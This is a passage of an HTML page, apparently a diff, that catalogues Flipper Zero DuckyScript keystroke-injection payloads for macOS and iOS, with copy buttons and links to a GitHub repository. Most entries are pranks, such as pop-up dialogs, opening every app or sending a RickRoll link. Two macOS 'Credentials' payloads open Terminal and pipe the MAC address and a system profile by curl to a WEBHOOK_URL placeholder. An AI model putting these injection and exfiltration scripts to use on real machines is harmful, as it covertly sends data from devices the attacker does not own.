+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero/tree/main/win/WiFikeyToWebhook-FlipZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+    </div>
+  </div>
+
+  <div class="contribute">
+    <div class="contribute-body">
+      <div class="contribute-title">
+        <svg width="11" height="11" viewBox="0 0 16 16" fill="currentColor"><path d="M1.5 3.25a2.25 2.25 0 1 1 3 2.122v5.256a2.251 2.251 0 1 1-1.5 0V5.372A2.25 2.25 0 0 1 1.5 3.25Zm5.677-.177L9.573.677A.25.25 0 0 1 10 .854V2.5h1A2.5 2.5 0 0 1 13.5 5v5.628a2.251 2.251 0 1 1-1.5 0V5a1 1 0 0 0-1-1h-1v1.646a.25.25 0 0 1-.427.177L7.177 3.427a.25.25 0 0 1 0-.354Z"/></svg>
+        Want to add a payload?
+      </div>
+      <p class="contribute-desc">This library is open source. Fork the repo, add your <code>.txt</code> payload following the existing structure, and open a pull request. All platforms welcome.</p>
+    </div>
+    <div class="contribute-actions">
+      <a class="btn btn-ghost" href="https://github.com/bst04/payloads_flipperZero/fork" target="_blank" rel="noopener">Fork repo</a>
+      <a class="btn btn-solid" href="https://github.com/bst04/payloads_flipperZero/pulls" target="_blank" rel="noopener">Open a Pull Request</a>
+    </div>
+  </div>
+</section>
+
+<!-- ════ macOS ════ -->
+<section class="os-section" id="section-macos">
+  <div class="section-head">
+    <div class="section-title">🍎 macOS <span class="section-sub">DuckyScript 1.0</span></div>
+    <span class="section-pill">26 payloads</span>
+  </div>
+
+  <div class="cat-group" id="macos-Execution">
+    <div class="cat-head"><span class="cat-title">Execution</span><div class="cat-rule"></div><span class="cat-count">16</span></div>
+    <div class="cards">
+      <article class="card">
+        <div class="card-top"><span class="card-title">Change Discord Name</span><span class="pap-badge"><span class="dot dot-g"></span>Green</span></div>
+        <div class="tags"><span class="tag tag-mac">macOS</span><span class="tag tag-cat">Execution</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM Change Discord Name — macOS</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">GUI</span> SPACE
+<span class="kw">DELAY</span> <span class="num">500</span>
+<span class="kw">STRING</span> Discord
+<span class="kw">ENTER</span>
+<span class="kw">DELAY</span> <span class="num">1500</span>
+<span class="kw">STRING</span> Hacked by Flipper Zero 🐬
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+      <article class="card">
+        <div class="card-top"><span class="card-title">Open All Apps</span><span class="pap-badge"><span class="dot dot-g"></span>Green</span></div>
+        <div class="tags"><span class="tag tag-mac">macOS</span><span class="tag tag-cat">Execution</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM Open All Applications</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">GUI</span> SPACE
+<span class="kw">DELAY</span> <span class="num">500</span>
+<span class="kw">STRING</span> Terminal
+<span class="kw">ENTER</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">STRING</span> ls /Applications/*.app | xargs -I {} open <span class="str">"{}"</span>
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+    </div>
+  </div>
+
+  <div class="cat-group" id="macos-Credentials">
+    <div class="cat-head"><span class="cat-title">Credentials</span><div class="cat-rule"></div><span class="cat-count">2</span></div>
+    <div class="cards">
+      <article class="card">
+        <div class="card-top"><span class="card-title">Get MAC Address → Webhook</span><span class="pap-badge"><span class="dot dot-o"></span>Orange</span></div>
+        <div class="tags"><span class="tag tag-mac">macOS</span><span class="tag tag-cat">Credentials</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM Get MAC Address → Webhook</span>
+<span class="cmt">REM ⚠ Replace WEBHOOK_URL</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">GUI</span> SPACE
+<span class="kw">STRING</span> Terminal
+<span class="kw">ENTER</span>
+<span class="kw">DELAY</span> <span class="num">800</span>
+<span class="kw">STRING</span> ifconfig en0 | grep ether | awk '{print $2}' | curl -X POST -d @- WEBHOOK_URL
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+      <article class="card">
+        <div class="card-top"><span class="card-title">Send System Profile → Webhook</span><span class="pap-badge"><span class="dot dot-o"></span>Orange</span></div>
+        <div class="tags"><span class="tag tag-mac">macOS</span><span class="tag tag-cat">Credentials</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM Send System Profile → Webhook</span>
+<span class="cmt">REM ⚠ Replace WEBHOOK_URL</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">GUI</span> SPACE
+<span class="kw">STRING</span> Terminal
+<span class="kw">ENTER</span>
+<span class="kw">DELAY</span> <span class="num">800</span>
+<span class="kw">STRING</span> system_profiler SPSoftwareDataType SPHardwareDataType | curl -X POST -d @- WEBHOOK_URL
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+    </div>
+  </div>
+
+  <div class="cat-group" id="macos-Prank">
+    <div class="cat-head"><span class="cat-title">Prank</span><div class="cat-rule"></div><span class="cat-count">5</span></div>
+    <div class="cards">
+      <article class="card">
+        <div class="card-top"><span class="card-title">Pop Up Dialog</span><span class="pap-badge"><span class="dot dot-g"></span>Green</span></div>
+        <div class="tags"><span class="tag tag-mac">macOS</span><span class="tag tag-cat">Prank</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM Pop Up dialog</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">GUI</span> SPACE
+<span class="kw">STRING</span> Terminal
+<span class="kw">ENTER</span>
+<span class="kw">DELAY</span> <span class="num">800</span>
+<span class="kw">STRING</span> osascript -e <span class="str">'display dialog "Hacked by Flipper Zero!" with title "Warning"'</span>
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+    </div>
+  </div>
+
+  <div class="cat-group" id="macos-General">
+    <div class="cat-head"><span class="cat-title">General</span><div class="cat-rule"></div><span class="cat-count">2</span></div>
+    <div class="cards">
+      <article class="card">
+        <div class="card-top"><span class="card-title">Go to Repository</span><span class="pap-badge"><span class="dot dot-g"></span>Green</span></div>
+        <div class="tags"><span class="tag tag-mac">macOS</span><span class="tag tag-cat">General</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM Open Repository in Safari</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">GUI</span> SPACE
+<span class="kw">STRING</span> https://github.com/bst04/payloads_flipperZero
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+    </div>
+  </div>
+
+  <div class="cat-group" id="macos-Updates">
+    <div class="cat-head"><span class="cat-title">Updates</span><div class="cat-rule"></div><span class="cat-count">1</span></div>
+    <div class="cards">
+      <article class="card">
+        <div class="card-top"><span class="card-title">Force Software Update</span><span class="pap-badge"><span class="dot dot-g"></span>Green</span></div>
+        <div class="tags"><span class="tag tag-mac">macOS</span><span class="tag tag-cat">Updates</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM Force macOS Software Update</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">GUI</span> SPACE
+<span class="kw">STRING</span> Terminal
+<span class="kw">ENTER</span>
+<span class="kw">DELAY</span> <span class="num">800</span>
+<span class="kw">STRING</span> softwareupdate --all --install --force
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+    </div>
+  </div>
+
+  <div class="contribute">
+    <div class="contribute-body">
+      <div class="contribute-title">
+        <svg width="11" height="11" viewBox="0 0 16 16" fill="currentColor"><path d="M1.5 3.25a2.25 2.25 0 1 1 3 2.122v5.256a2.251 2.251 0 1 1-1.5 0V5.372A2.25 2.25 0 0 1 1.5 3.25Zm5.677-.177L9.573.677A.25.25 0 0 1 10 .854V2.5h1A2.5 2.5 0 0 1 13.5 5v5.628a2.251 2.251 0 1 1-1.5 0V5a1 1 0 0 0-1-1h-1v1.646a.25.25 0 0 1-.427.177L7.177 3.427a.25.25 0 0 1 0-.354Z"/></svg>
+        Want to add a payload?
+      </div>
+      <p class="contribute-desc">Got a macOS script that works? Fork the repo and submit a pull request.</p>
+    </div>
+    <div class="contribute-actions">
+      <a class="btn btn-ghost" href="https://github.com/bst04/payloads_flipperZero/fork" target="_blank" rel="noopener">Fork repo</a>
+      <a class="btn btn-solid" href="https://github.com/bst04/payloads_flipperZero/pulls" target="_blank" rel="noopener">Open a Pull Request</a>
+    </div>
+  </div>
+</section>
+
+<!-- ════ iOS ════ -->
+<section class="os-section" id="section-ios">
+  <div class="section-head">
+    <div class="section-title">📱 iOS <span class="section-sub">DuckyScript 1.0</span></div>
+    <span class="section-pill">3 payloads</span>
+  </div>
+
+  <div class="cat-group" id="ios-Prank">
+    <div class="cat-head"><span class="cat-title">Prank</span><div class="cat-rule"></div><span class="cat-count">2</span></div>
+    <div class="cards">
+      <article class="card">
+        <div class="card-top"><span class="card-title">Text Someone</span><span class="pap-badge"><span class="dot dot-o"></span>Orange</span></div>
+        <div class="tags"><span class="tag tag-ios">iOS</span><span class="tag tag-cat">Prank</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM Text Someone — iOS</span>
+<span class="cmt">REM ⚠ Requires contact configured</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">HOME</span>
+<span class="kw">DELAY</span> <span class="num">500</span>
+<span class="kw">STRING</span> Hacked by Flipper Zero 🐬
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+      <article class="card">
+        <div class="card-top"><span class="card-title">RickRoll Contacts</span><span class="pap-badge"><span class="dot dot-g"></span>Green</span></div>
+        <div class="tags"><span class="tag tag-ios">iOS</span><span class="tag tag-cat">Prank</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM RickRoll Contacts — iOS</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">HOME</span>
+<span class="kw">DELAY</span> <span class="num">500</span>
+<span class="kw">STRING</span> https://youtu.be/dQw4w9WgXcQ
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+    </div>
+  </div>
+
+  <div class="cat-group" id="ios-General">
+    <div class="cat-head"><span class="cat-title">General</span><div class="cat-rule"></div><span class="cat-count">1</span></div>
+    <div class="cards">
+      <article class="card">
+        <div class="card-top"><span class="card-title">Go to Repository</span><span class="pap-badge"><span class="dot dot-g"></span>Green</span></div>
+        <div class="tags"><span class="tag tag-ios">iOS</span><span class="tag tag-cat">General</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM Open Repository — iOS</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">HOME</span>
+<span class="kw">DELAY</span> <span class="num">500</span>
+<span class="kw">STRING</span> https://github.com/bst04/payloads_flipperZero
+<span class="kw">ENTER</span></code></pre>
+        </div>
